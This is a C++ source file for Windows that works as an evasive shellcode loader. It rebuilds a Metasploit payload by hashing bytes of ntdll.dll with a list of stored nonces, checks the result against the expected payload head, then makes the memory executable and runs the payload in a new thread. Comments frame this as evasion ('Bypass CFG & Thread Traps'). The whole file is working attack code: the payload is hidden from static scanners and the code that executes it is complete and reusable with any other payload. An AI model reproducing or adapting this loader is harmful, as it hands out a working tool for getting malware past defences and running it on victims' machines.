#include <windows.h>
#include <bcrypt.h>
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
// INSERT_DEFINITIONS_HERE
// Link the Cryptography Next Generation (CNG) library
#pragma comment(lib, "bcrypt.lib")

// The coordinates mined by the GPU
struct KeybookEntry {
    uint64_t nonce;
    int offset;
    int length;
};

// Convert a byte array to a lowercase hex string
std::string BytesToHexString(const std::vector<BYTE>& bytes) {
    std::ostringstream oss;
    for (BYTE b : bytes) {
        oss << std::hex << std::setw(2) << std::setfill('0') << (int)b;
    }
    return oss.str();
}

// Convert a hex string back to raw bytes for execution
std::vector<BYTE> HexStringToBytes(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        BYTE b = (BYTE)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(b);
    }
    return bytes;
}

int main() {
    std::cout << "[*] Initiating Hash Frying Reconstructor..." << std::endl;

    const char* source_file = "C:\\Windows\\System32\\ntdll.dll";
    HANDLE hFile = CreateFileA(source_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Environmental Mismatch: Cannot read entropy source." << std::endl;
        return 1;
    }

    std::vector<BYTE> seed(5120);
    DWORD bytesRead;
    ReadFile(hFile, seed.data(), 5120, &bytesRead, NULL);
    CloseHandle(hFile);

    // [PASTE YOUR EXACT KEYBOOK ARRAY HERE]
  std::vector<KeybookEntry> keybook = {
        {121908905, 39, 8},
        {10077592, 31, 8},
        {20884329, 109, 8},
        {5417402, 24, 8},
        {5022417, 94, 8},
        {26214488, 30, 8},
        {10596746, 62, 8},
        {23730462, 13, 8},
        {5384478, 35, 8},
        {11128952, 31, 8},
        {147428755, 56, 8},
        {4462361, 79, 8},
        {5328468, 1, 8},
        {86680469, 86, 8},
        {45318696, 12, 8},
        {23410211, 9, 8},
        {16148420, 10, 8},
        {20789604, 81, 8},
        {29011449, 11, 8},
        {18178085, 87, 8},
        {65259135, 33, 8},
        {94004753, 105, 8},
        {13349701, 3, 8},
        {14706910, 46, 8},
        {98503874, 32, 8},
        {76471086, 48, 8},
        {17187056, 115, 8},
        {36590674, 24, 8},
        {8221038, 101, 8},
        {4462361, 79, 8},
        {6101657, 37, 8},
        {46213964, 55, 8},
        {3600221, 79, 8},
        {35004005, 9, 8},
        {21993835, 3, 8},
        {20225341, 72, 8},
        {22555667, 96, 8},
        {40626536, 82, 8},
        {23205590, 3, 8},
        {55696190, 75, 8},
        {7446236, 17, 8},
        {18090545, 102, 8},
        {43667266, 19, 8},
        {54867057, 95, 8},
        {29124338, 103, 8},
        {68014116, 7, 8},
        {16389498, 57, 8},
        {12493528, 109, 8},
        {45674002, 105, 8},
        {9574135, 81, 8},
        {76548044, 26, 8},
        {2592599, 28, 8},
        {1475131, 10, 8},
        {25416337, 109, 8},
        {109998530, 43, 8},
        {64780330, 88, 8},
        {987268, 95, 8},
        {25942689, 40, 8},
        {33596916, 90, 8},
        {11359987, 87, 8},
        {19898282, 7, 8},
        {83707112, 94, 8},
        {6874581, 18, 8},
        {38979497, 16, 8},
        {30001889, 5, 8},
        {1062836, 72, 8},
        {25644487, 118, 8},
        {1132045, 110, 8},
        {10384794, 90, 8}
    };

    std::vector<BYTE> final_shellcode;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA512_ALGORITHM, NULL, 0);
    DWORD cbHashObject = 0, cbData = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbData, 0);
    std::vector<BYTE> pbHashObject(cbHashObject);
    std::vector<BYTE> pbHash(64);

    std::cout << "[*] Extracting Shellcode from Environment..." << std::endl;
    for (const auto& key : keybook) {
        BCRYPT_HASH_HANDLE hHash = NULL;
        BCryptCreateHash(hAlg, &hHash, pbHashObject.data(), cbHashObject, NULL, 0, 0);

        std::string nonce_str = std::to_string(key.nonce);
        BCryptHashData(hHash, seed.data(), seed.size(), 0);
        BCryptHashData(hHash, (PUCHAR)nonce_str.c_str(), nonce_str.length(), 0);
        BCryptFinishHash(hHash, pbHash.data(), pbHash.size(), 0);
        BCryptDestroyHash(hHash);

        std::string full_hash_hex = BytesToHexString(pbHash);
        std::string hex_fragment = full_hash_hex.substr(key.offset, key.length);
        std::vector<BYTE> raw_bytes = HexStringToBytes(hex_fragment);
        final_shellcode.insert(final_shellcode.end(), raw_bytes.begin(), raw_bytes.end());
    }
    BCryptCloseAlgorithmProvider(hAlg, 0);

    // --- SANITY CHECK: VERIFY THE RECONSTRUCTED MATH ---
    std::string test_hex = BytesToHexString(final_shellcode);
    std::cout << "\n[!] RECONSTRUCTED PAYLOAD HEAD: " << test_hex.substr(0, 30) << "..." << std::endl;
    std::cout << "[!] EXPECTED METASPLOIT HEAD: fc4883e4f0e8c00000004151415052..." << std::endl;

    if (test_hex.substr(0, 10) != "fc4883e4f0") {
        std::cout << "\n[CRITICAL FAILURE] Math Mismatch! The GPU hashed differently than Windows BCrypt." << std::endl;
        return 1;
    }

    // --- EVASIVE EXECUTION (Bypass CFG & Thread Traps) ---
    std::cout << "\n[*] Allocating Executable Memory..." << std::endl;
    void* exec_mem = VirtualAlloc(0, final_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(exec_mem, final_shellcode.data(), final_shellcode.size());

    DWORD oldProtect;
    VirtualProtect(exec_mem, final_shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);

    std::cout << "[!] Detonating Shellcode via CreateThread..." << std::endl;

    // CreateThread is much safer for executing shellcode in C++ than a direct jump
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);

    // Wait for the thread to actually spawn the calculator before closing the C++ program
    WaitForSingleObject(hThread, 3000);

    return 0;
}